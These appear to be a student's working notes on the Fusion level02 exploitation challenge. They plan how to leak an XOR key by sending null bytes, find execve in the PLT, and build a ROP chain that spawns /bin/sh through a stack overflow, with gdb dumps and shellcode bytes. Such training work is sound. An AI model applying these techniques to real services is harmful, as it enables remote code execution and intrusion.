About

This level deals with some basic obfuscation / math stuff.

This level introduces non-executable memory and return into libc / .text / return orientated programming (ROP).

Vulnerability Type			Stack
Position Independent Executable		No
Read only relocations			No
Non-Executable stack			Yes
Non-Executable heap			Yes
Address Space Layout Randomisation	Yes
Source Fortification			No


Generate key and xor it with incoming data

key[32] = /dev/urandom

for(j = 0; j < blocks; j++) {
      blahi[j] ^= keybuf[j % XORSZ];
}

Attacking the key is the first part of this challenge and can be done so easily
   Extract the key by:
      sending 32 integers of 0, or 128 "\x00"s
      read the output buffer
   Encode bytes with key
   When XOR'd contains original value

Steps:
   send 128 bytes of \x00 to receive key
   Extract key into variable
   Encode ROP with key using xor
   send ROP and overflow

Containing \x00 in shell code is not a big deal anymore because of read call, but is irrelevant b/c nonexecutable stack

Key is assigned with this code
   0x0804975b <+38>:	mov    DWORD PTR [esp+0x8],0x80
   0x08049763 <+46>:	mov    DWORD PTR [esp+0x4],0x804b480   <--- is the address of key
   0x0804976b <+54>:	mov    eax,DWORD PTR [ebp-0x14]
   0x0804976e <+57>:	mov    DWORD PTR [esp],eax
   0x08049771 <+60>:	call   0x8048860 <read@plt>


We know the address of key, and it's in R/W space.  
Would it be possible to set esp to 0x804b480 and use that area like a stack?

Permissions of memory region
  0x804b420->0x804b500 at 0x00002418: .bss ALLOC   <-- Can I execute in this space?


gdb info files and searching for got.plt
	0x0804b36c - 0x0804b410 is .got.plt


1) File descriptors duplicated for STDIN/OUT so we can call execve directly
2) execve( char* bin_sh, argv, NULL)
3) Is execve in import table?
   Symbol table '.dynsym' contains 46 entries:
   Num:    Value  Size Type    Bind   Vis      Ndx Name
     0: 00000000     0 NOTYPE  LOCAL  DEFAULT  UND 
     1: 00000000     0 FUNC    GLOBAL DEFAULT  UND setsockopt@GLIBC_2.0 (2)
     2: 00000000     0 FUNC    GLOBAL DEFAULT  UND dup2@GLIBC_2.0 (2)
     3: 00000000     0 FUNC    GLOBAL DEFAULT  UND setresuid@GLIBC_2.0 (2)
     4: 00000000     0 FUNC    GLOBAL DEFAULT  UND read@GLIBC_2.0 (2)
     5: 00000000     0 FUNC    GLOBAL DEFAULT  UND printf@GLIBC_2.0 (2)
     6: 00000000     0 FUNC    GLOBAL DEFAULT  UND signal@GLIBC_2.0 (2)
     7: 00000000     0 FUNC    GLOBAL DEFAULT  UND wait@GLIBC_2.0 (2)
     8: 00000000     0 FUNC    GLOBAL DEFAULT  UND htons@GLIBC_2.0 (2)
     9: 00000000     0 FUNC    GLOBAL DEFAULT  UND err@GLIBC_2.0 (2)
    10: 00000000     0 FUNC    GLOBAL DEFAULT  UND setgroups@GLIBC_2.0 (2)
    11: 00000000     0 FUNC    GLOBAL DEFAULT  UND accept@GLIBC_2.0 (2)
    12: 00000000     0 FUNC    GLOBAL DEFAULT  UND fwrite@GLIBC_2.0 (2)
    13: 00000000     0 FUNC    GLOBAL DEFAULT  UND getpid@GLIBC_2.0 (2)
    14: 00000000     0 FUNC    GLOBAL DEFAULT  UND daemon@GLIBC_2.0 (2)
    15: 00000000     0 FUNC    GLOBAL DEFAULT  UND setrlimit@GLIBC_2.2 (3)
    16: 00000000     0 FUNC    GLOBAL DEFAULT  UND malloc@GLIBC_2.0 (2)
    17: 00000000     0 FUNC    GLOBAL DEFAULT  UND puts@GLIBC_2.0 (2)
    18: 00000000     0 FUNC    GLOBAL DEFAULT  UND strerror@GLIBC_2.0 (2)
    19: 00000000     0 NOTYPE  WEAK   DEFAULT  UND __gmon_start__
    20: 00000000     0 FUNC    GLOBAL DEFAULT  UND exit@GLIBC_2.0 (2)
    21: 00000000     0 FUNC    GLOBAL DEFAULT  UND open@GLIBC_2.0 (2)
    22: 00000000     0 FUNC    GLOBAL DEFAULT  UND srand@GLIBC_2.0 (2)
    23: 00000000     0 FUNC    GLOBAL DEFAULT  UND __libc_start_main@GLIBC_2.0 (2)
    24: 00000000     0 FUNC    GLOBAL DEFAULT  UND fprintf@GLIBC_2.0 (2)
    25: 00000000     0 FUNC    GLOBAL DEFAULT  UND execve@GLIBC_2.0 (2)             <------ execve

    - walked the plt starting at 0x8048b3d
    (gdb) info files
            0x0804b36c - 0x0804b410 is .got.plt
        
    - 0xb36c + 25*4 = 0xb3D0, first two entries of got[0] and got[1] are reserved
      0xb3d0 + 0x4 + 0x4 = 0xb3d8

    (gdb) x/wx 0x804b3d8  (execve@plt)
            0x804b3d8 <execve@got.plt>:	0x080489b6 (plt entry)
    
    - 0x80489b6 means function hasn't been resolved yet otherwise we'd see something likx 0xb......

    (gdb) disas 0x80489b6
          Dump of assembler code for function execve@plt:
            0x080489b0 <+0>:	jmp    DWORD PTR ds:0x804b3d8
            0x080489b6 <+6>:	push   0xc0
            0x080489bb <+11>:	jmp    0x8048820
    
    - at this point we can jump straight to this addres 0x80489b6 when we set the stack properly

4) Setting up the stack
  
   xor eax, eax
   push eax
   push 0x68732f2f
   push 0x6e69622f
   mov ebx, esp     ; get ptr to /bin//sh
   push eax
   push ebx

   Stack looks like this:

   |_ptr_to_/bin/sh 
   |_NULL______      <---- this can be included in our shell code
   | "/bin/sh"
   |___________
   |_NULL______

   NULL             /bin/sh                            NULL
   "\x00\x00\x00\x00\x2f\x62\x69x6e\x68\x73\x2f\x2f\x6e\x00\x00\x00\x00 + !!!PTR!!!

5) Selecting Gadgets
   
   \x00\x00\x00\x00
   \x2f\x62\x69x6e\x68\x73\x2f\x2f\x6e\x00\x00\x00\x00
   
   xor eax, eax       '''|   
   push eax              |  can be completed by smashing our stack
   push 0x68732f2f       |
   push 0x6e69622f    ,,,|


   mov ebx, esp       '''|     
   push eax              |  these need to be gadgets
   push ebx           ,,,|



----------------------------------------------------------------------------------------------
Can we return to the process to have everything done for me?


disas restart_process
   .....
   .....
   | ebp
   | eip
   | ptr to process name
   | 
   |
 



   0x0804944a <+0>:	push   ebp
   0x0804944b <+1>:	mov    ebp,esp
   0x0804944d <+3>:	sub    esp,0x28

   0x08049450 <+6>:	mov    eax,DWORD PTR [ebp+0x8]           <--- arg1 ( process name)
   0x08049453 <+9>:	mov    DWORD PTR [esp],eax               
   0x08049456 <+12>:	call   0x8048bc9 <validate_name>         <--- just makes sure process name is alphanumeric 
   0x0804945b <+17>:	mov    eax,0x8049d6d                     <--- "/opt/fusion/bin/%s"
   0x08049460 <+22>:	mov    edx,DWORD PTR [ebp+0x8]
   0x08049463 <+25>:	mov    DWORD PTR [esp+0x8],edx
   0x08049467 <+29>:	mov    DWORD PTR [esp+0x4],eax
   0x0804946b <+33>:	lea    eax,[ebp-0x14]    
   0x0804946e <+36>:	mov    DWORD PTR [esp],eax
   0x08049471 <+39>:	call   0x8048a10 <asprintf@plt>          <----- formats binary to be "/opt/fusion/bin/%s"
   0x08049476 <+44>:	mov    DWORD PTR [ebp-0x10],0x8049d80    <----- "--client"
   0x0804947d <+51>:	mov    DWORD PTR [ebp-0xc],0x0
   0x08049484 <+58>:	mov    edx,DWORD PTR ds:0x804b420        <----- char** environ
   0x0804948a <+64>:	mov    eax,DWORD PTR [ebp-0x14]
   0x0804948d <+67>:	mov    DWORD PTR [esp+0x8],edx           <----- char** environ
   0x08049491 <+71>:	lea    edx,[ebp-0x14] 
   0x08049494 <+74>:	mov    DWORD PTR [esp+0x4],edx           <----- argv for execve
   0x08049498 <+78>:	mov    DWORD PTR [esp],eax               <----- process name for execve
   0x0804949b <+81>:	call   0x80489b0 <execve@plt>
   0x080494a0 <+86>:	call   0x8048a00 <__errno_location@plt>
   0x080494a5 <+91>:	mov    eax,DWORD PTR [eax]
   0x080494a7 <+93>:	mov    DWORD PTR [esp],eax
   0x080494aa <+96>:	call   0x8048940 <strerror@plt>
   0x080494af <+101>:	mov    ecx,DWORD PTR [ebp-0x14]
   0x080494b2 <+104>:	mov    edx,0x8049d89
   0x080494b7 <+109>:	mov    DWORD PTR [esp+0x8],eax
   0x080494bb <+113>:	mov    DWORD PTR [esp+0x4],ecx
   0x080494bf <+117>:	mov    DWORD PTR [esp],edx
   0x080494c2 <+120>:	call   0x8048870 <printf@plt>
   0x080494c7 <+125>:	mov    DWORD PTR [esp],0x1
   0x080494ce <+132>:	call   0x8048960 <exit@plt>

----------------------------------------

Inspecting environment

(gdb) x/s **0x0804b420
0xbfd63990:	 "SHELL=/bin/bash"
0xbfd639a0:	 "TERM=xterm-256color"
0xbfd639b4:	 "USER=root"
0xbfd639be:	 "LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arj=01;31"...
0xbfd63a86:	 ":*.taz=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lz=01;31:*.xz=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.d"...
0xbfd63b4e:	 "eb=01;31:*.rpm=01;31:*.jar=01;31:*.rar=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.jpg=01;35:*.jpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35"...
0xbfd63c16:	 ":*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.ogm=01;35:*.mp4=01;35:*.m4"...
0xbfd63cde:	 "v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*."...
0xbfd63da6:	 "yuv=01;35:*.cgm=01;35:*.emf=01;35:*.axv=01;35:*.anx=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;3"...
0xbfd63e6e:	 "6:*.wav=00;36:*.axa=00;36:*.oga=00;36:*.spx=00;36:*.xspf=00;36:"
0xbfd63eae:	 "SUDO_USER=fusion"
0xbfd63ebf:	 "SUDO_UID=1000"
0xbfd63ecd:	 "USERNAME=root"
0xbfd63edb:	 "MAIL=/var/mail/root"
0xbfd63eef:	 "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games"
0xbfd63f3c:	 "PWD=/opt/fusion/bin"
0xbfd63f50:	 "LANG=en_US.UTF-8"
0xbfd63f61:	 "SHLVL=1"
0xbfd63f69:	 "SUDO_COMMAND=/bin/su"
0xbfd63f7e:	 "HOME=/root"
0xbfd63f89:	 "LOGNAME=root"
0xbfd63f96:	 "LESSOPEN=| /usr/bin/lesspipe %s"
0xbfd63fb6:	 "SUDO_GID=1000"
0xbfd63fc4:	 "LESSCLOSE=/usr/bin/lesspipe %s %s"
0xbfd63fe6:	 "_=./level02"
0xbfd63ff2:	 "./level02"


--------------------------------------



execve(esp,{ESP, NULL}, NULL} 

garbage return
esp
&esp
NULL
environ


/bin/sh    <----- esp

---------------------------------------

Revised strategy:

We control EBP, and encrypt file picks the location to write the buffer based on offset from ebp.  Therefore, it is possible to have encrypt file write to 
arbitrary memory locations.  The next step is rop into encrypt_file such that I can put my shell code into a RWX section or set up a call to execve

Writable Sections:

  [18] .init_array       INIT_ARRAY      0804b274 002274 000008 00  WA  0   0  4
  [19] .ctors            PROGBITS        0804b27c 00227c 000008 00  WA  0   0  4
  [20] .dtors            PROGBITS        0804b284 002284 000008 00  WA  0   0  4
  [21] .jcr              PROGBITS        0804b28c 00228c 000004 00  WA  0   0  4
  [22] .dynamic          DYNAMIC         0804b290 002290 0000d8 08  WA  6   0  4
  [23] .got              PROGBITS        0804b368 002368 000004 04  WA  0   0  4
  [24] .got.plt          PROGBITS        0804b36c 00236c 0000a4 04  WA  0   0  4
  [25] .data             PROGBITS        0804b410 002410 000008 00  WA  0   0  4
  [26] .bss              NOBITS          0804b420 002418 0000e0 00  WA  0   0 32

Executable Sections:
  [11] .init             PROGBITS        080487ec 0007ec 00002e 00  AX  0   0  4
  [12] .plt              PROGBITS        08048820 000820 000270 04  AX  0   0 16
  [13] .text             PROGBITS        08048a90 000a90 000f7c 00  AX  0   0 16
  [14] .fini             PROGBITS        08049a0c 001a0c 00001a 00  AX  0   0  4

Because there is no overlap between writable and executable sections, will need to set EBP to bss region then call execve from the plt




